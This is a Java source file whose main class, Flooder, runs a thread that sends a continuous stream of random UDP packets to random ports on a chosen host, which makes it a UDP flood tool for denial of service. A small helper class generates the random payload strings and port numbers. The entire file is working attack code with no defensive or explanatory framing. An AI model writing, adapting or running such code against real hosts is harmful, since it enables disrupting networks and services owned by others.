/*
 * To change this template, choose Tools | Templates
 * and open the template in the editor.
 */
package ignis.v;

import java.io.BufferedReader;
import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.InetAddress;
import java.util.Random;
import java.util.regex.*;

/**
 *
 * @author henrypitcairn
 */
class Rndm {
    private static Random rn;
    public static String randInt(int min, int max)
    {
        return Integer.toString((min + (int)(Math.random()*(max-min))));
    }
    public static String randInt(int max)
    {
        return Integer.toString(((int)(Math.random()*(max))));
    }
    public static int intRandInt(int min, int max)
    {
         return (min + (int)(Math.random()*(max-min)));
    }
    public static int intRandInt(int max)
    {
        return (int)(Math.random()*(max));
    }
    public static String randString(int length)
    {
        String randstr="";
        for (int i=0; i<=length; i++)
        {
            int charset = 1 + (int)(Math.random()*3);
            if (charset==1)
            {
                char randChar = (char) (48 + (int)(Math.random()*(57-48)));
                randstr += randChar;
            }
            else if (charset==2)
            {
                char randChar = (char) (65 + (int)(Math.random()*(90-65)));
                randstr += randChar;
            }
            else if (charset==3)
            {
                char randChar = (char) (97 + (int)(Math.random()*(122-97)));
                randstr += randChar;
            }
        }
        return randstr;
    }
    
}
public class Flooder implements Runnable {
    private BufferedReader in;
    private DatagramSocket sock;
    private boolean stop;
    private InetAddress host;
    private Thread t;
    private final String IPV4_PATTERN = "(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)";
    public Flooder(String host) throws java.net.UnknownHostException, java.net.SocketException {
        t = new Thread((Runnable) this);
        this.host = InetAddress.getByName(host);
        sock = new DatagramSocket();
        stop = false;
        //t.start();
    }
    public boolean isIPAddress(String addr) {
        Pattern p = Pattern.compile(IPV4_PATTERN);
        Matcher m = p.matcher(addr);
        boolean isIP = false;
        if (m.find()) {
            isIP = true;
        }
        return isIP;
    }
    public void send(String data, int port) {
        byte[] byte_data = data.getBytes();
        DatagramPacket sendPacket = new DatagramPacket(byte_data, byte_data.length, host, port);
        try {sock.send(sendPacket);} catch (Exception e){}
    }
    public void stop() {
        stop = true;
        sock.close();
    }
    public void start() {
        t.start();
    }
    public void run(){
        while (!stop) {
            String randData = Rndm.randString(Rndm.intRandInt(32, 1024));
            int port = Rndm.intRandInt(1, 65535);
            send(randData, port);
        }
    }
}
